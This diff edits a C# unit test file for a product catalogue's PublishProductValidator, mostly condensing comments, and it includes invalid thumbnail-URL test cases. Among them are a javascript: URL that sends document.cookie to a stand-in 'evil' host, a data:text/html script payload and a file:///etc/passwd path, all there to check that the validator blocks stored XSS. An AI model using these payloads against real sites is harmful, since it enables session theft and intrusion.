@@ -5,11 +5,6 @@ using Xunit;
 
 namespace Catalog.Application.Tests;
 
-/// <summary>
-/// The user-input boundary, tested without the pipeline: the behaviour that
-/// runs validators is Common.Application's and already covered there; what is
-/// this service's is which requests these rules refuse.
-/// </summary>
 public class PublishProductValidatorTests
 {
     private static readonly PublishProductValidator Validator = new();
@@ -36,11 +31,8 @@ public class PublishProductValidatorTests
     [InlineData("https://cdn.example/desk.jpg?v=2&size=large")]
     public void An_http_thumbnail_is_valid(string url)
     {
-        // The positive half, and it is not decoration: a rule that refused
-        // every URL would pass every negative case in Invalid() while breaking
-        // the field. The upper-case scheme is here because Uri.Scheme
-        // normalises to lower case — a comparison written against the raw text
-        // would refuse a legal URL.
+        // The positive half, since a rule refusing every URL passes every case in Invalid(). The upper-case
+        // scheme is here because Uri.Scheme normalises to lower case.
         Validator.Validate(Valid() with { ThumbnailUrl = url }).IsValid.ShouldBeTrue(url);
     }
 
@@ -53,18 +45,13 @@ public class PublishProductValidatorTests
 
     public static TheoryData<string, PublishProductCommand> Invalid() => new()
     {
-        // An omitted CommandId binds as Guid.Empty, which is a single
-        // SHARED idempotency key rather than an absent one (§8.5) — so the
-        // guard is load-bearing, and Valid() mints a fresh id, which is why
-        // deleting the rule left every other case here green.
+        // An omitted CommandId binds as Guid.Empty, one shared idempotency key rather than an absent one (§8.5).
         { nameof(PublishProductCommand.CommandId), Valid() with { CommandId = Guid.Empty } },
         { nameof(PublishProductCommand.Name), Valid() with { Name = "" } },
         { nameof(PublishProductCommand.Name), Valid() with { Name = new string('x', 201) } },
         { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = new string('x', 401) } },
-        // The scheme cases. This value is stored and served to every reader of
-        // the catalogue (§6.5), and a renderer binding it into an href acts on
-        // whatever scheme it carries — so the length rule alone left stored XSS
-        // one field away from an unauthenticated write.
+        // Served to every reader of the catalogue (§6.5), and a javascript: or data:text/html URL bound into an
+        // href is stored XSS.
         {
             nameof(PublishProductCommand.ThumbnailUrl),
             Valid() with { ThumbnailUrl = "javascript:fetch('//evil/'+document.cookie)" }
@@ -73,8 +60,7 @@ public class PublishProductValidatorTests
             nameof(PublishProductCommand.ThumbnailUrl),
             Valid() with { ThumbnailUrl = "data:text/html;base64,PHNjcmlwdD4=" }
         },
-        // A scheme this platform simply has no use for, so the rule is an
-        // allow-list of two rather than a deny-list of the ones thought of.
+        // A scheme with no use here, since the rule is an allow-list of two rather than a deny-list.
         { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "file:///etc/passwd" } },
         // Relative: no scheme to refuse, and nothing here serves an origin the
         // catalogue's images would be relative to.
